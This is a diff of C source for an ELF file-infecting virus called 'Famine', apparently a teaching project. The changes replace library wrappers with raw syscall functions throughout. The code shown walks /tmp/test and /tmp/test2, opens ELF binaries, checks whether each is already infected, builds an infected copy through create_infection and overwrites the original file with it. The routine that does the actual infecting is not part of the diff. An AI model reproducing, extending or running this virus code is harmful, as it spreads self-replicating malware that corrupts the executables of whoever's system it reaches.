@@ -67,7 +67,7 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 	ft_strcpy(file, path);
 	ft_strcat(file, "/");
 	ft_strcat(file, filename);
-	fd = __open(file, O_RDWR);
+	fd = syscall_open(file, O_RDWR);
 	if (fd > 0)
 	{
 		ret = read(fd, header, 64);
@@ -80,9 +80,9 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 				elf.filename = file;
 				elf.size = lseek(fd, (size_t)0, SEEK_END);
 				if (elf.size < 0 ||
-(elf.addr = __mmap(NULL, elf.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+(elf.addr = syscall_mmap(NULL, elf.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
 				{
-					__close(fd);
+					syscall_close(fd);
 					if (DEBUG)
 						debug_print_error(0, virus_elf->filename, file);
 					return ;
@@ -91,8 +91,8 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 				{
 					if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
 					{
-						__munmap(elf.addr, elf.size);
-						__close(fd);
+						syscall_munmap(elf.addr, elf.size);
+						syscall_close(fd);
 						if (DEBUG)
 							debug_print_error(ret, virus_elf->filename, file);
 						return ;
@@ -109,23 +109,23 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 						printf("final size: %ld\n", elf.size + size_needed + nb_zero_to_add);
 					}
 					char	*new;
-					new = __mmap(NULL, elf.size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+					new = syscall_mmap(NULL, elf.size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
 					if (!new)
 					{
-						__munmap(elf.addr, elf.size);
-						__close(fd);
+						syscall_munmap(elf.addr, elf.size);
+						syscall_close(fd);
 						if (DEBUG)
 							debug_print_error(ret, virus_elf->filename, file);
 						return ;
 					}
 					create_infection(new, &elf, virus_elf, nb_zero_to_add);
-					__munmap(elf.addr, elf.size);
-					__close(fd);
-					fd = __open(file, O_TRUNC | O_WRONLY);
+					syscall_munmap(elf.addr, elf.size);
+					syscall_close(fd);
+					fd = syscall_open(file, O_TRUNC | O_WRONLY);
 					if (fd < 0)
 						return ;
 					write(fd, new, elf.size + size_needed + nb_zero_to_add);
-					__munmap(new, elf.size + size_needed + nb_zero_to_add);
+					syscall_munmap(new, elf.size + size_needed + nb_zero_to_add);
 				}
 				else if (DEBUG)
 					printf("%s already infected.\n", file);
@@ -133,13 +133,13 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 		}
 		else if (DEBUG)
 			debug_print_error(ret, virus_elf->filename, file);
-		__close(fd);
+		syscall_close(fd);
 	}
 }
 
-void	print_dirent(t_linux_dirent *linux_dir)
+void	print_dirent(struct linux_dirent *linux_dir)
 {
-	 printf("%8ld  ", linux_dir->d_ino);
+	printf("%8ld  ", linux_dir->d_ino);
 	char d_type = *((char *)linux_dir + linux_dir->d_reclen - 1);
 	printf("%-10s ", (d_type == DT_REG) ?  "regular" :
 					(d_type == DT_DIR) ?  "directory" :
@@ -166,19 +166,19 @@ void	moving_through_path(t_elf *virus_elf, char *path, char *d_name)
 	if (strlen(d_name))
 		ft_strcat(new_path, "/");
 	ft_strcat(new_path, d_name);
-	stat(new_path, &statbuf);
+	syscall_stat(new_path, &statbuf);
 	if ((statbuf.st_mode & S_IFMT) == S_IFDIR)
 	{
-		fd =  __open(new_path, O_RDONLY | O_DIRECTORY);
+		fd =  syscall_open(new_path, O_RDONLY | O_DIRECTORY);
 		if (fd > 0)
 		{
 			int		nread;
 			int		rest;
 			rest = 0;
-			while ((nread = __getdents(fd, (t_linux_dirent *)(buffer + rest), 1024 - rest)) > 0)
+			while ((nread = syscall_getdents(fd, (struct linux_dirent *)(buffer + rest), 1024 - rest)) > 0)
 			{
 				long					bpos;
-				t_linux_dirent			*linux_dir;
+				struct linux_dirent		*linux_dir;
 				printf("==============> %s <================\n", new_path);
 				for (bpos = 0; bpos < nread;)
 				{
@@ -202,9 +202,9 @@ void	moving_through_path(t_elf *virus_elf, char *path, char *d_name)
 					bpos += linux_dir->d_reclen;
 				}
 			}
-//			printf("nread %d\n", nread);
+			printf("nread %d\n", nread);
 		}
-		__close(fd);
+		syscall_close(fd);
 	}
 	else
 		printf("%s: %d\n", new_path, statbuf.st_mode);
@@ -238,7 +238,7 @@ int		main(int argc, char *argv[])
 	ret = 0;
 	if (DEBUG)
 		debug_print_args(argc, argv);
-	fd = __open(argv[0], O_RDONLY);
+	fd = syscall_open(argv[0], O_RDONLY);
 	if (fd > 0)
 	{
 		/* TODO: Original infection
@@ -247,27 +247,27 @@ int		main(int argc, char *argv[])
 		if (!ft_strcmp(basename(argv[0]), "Famine"))
 		{
 			elf.filename = argv[0];
-			elf.size = lseek(fd, (size_t)0, SEEK_END);
+			elf.size = syscall_lseek(fd, (size_t)0, SEEK_END);
 			if (elf.size < 0 ||
-	(elf.addr = __mmap(NULL, elf.size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+	(elf.addr = syscall_mmap(NULL, elf.size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
 			{
-				__close(fd);
+				syscall_close(fd);
 				if (DEBUG)
 					debug_print_error(0, argv[0], argv[0]);
 				return (1);
 			}
 			if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
 			{
-				__munmap(elf.addr, elf.size);;
-				__close(fd);
+				syscall_munmap(elf.addr, elf.size);;
+				syscall_close(fd);
 				if (DEBUG)
 					debug_print_error(0, argv[0], argv[0]);
 				return (1);
 			}
 			moving_through_path(&elf, "/tmp/test", "");
 			moving_through_path(&elf, "/tmp/test2", "");
-			__munmap(elf.addr, elf.size);
-			__close(fd);
+			syscall_munmap(elf.addr, elf.size);
+			syscall_close(fd);
 		}
 		else
 			printf("Host\n");
@@ -275,6 +275,6 @@ int		main(int argc, char *argv[])
 	}
 	else if (DEBUG)
 		debug_print_error(0, argv[0], argv[0]);
-	__exit(0);
+	syscall_exit(0);
 	return (0);
 }
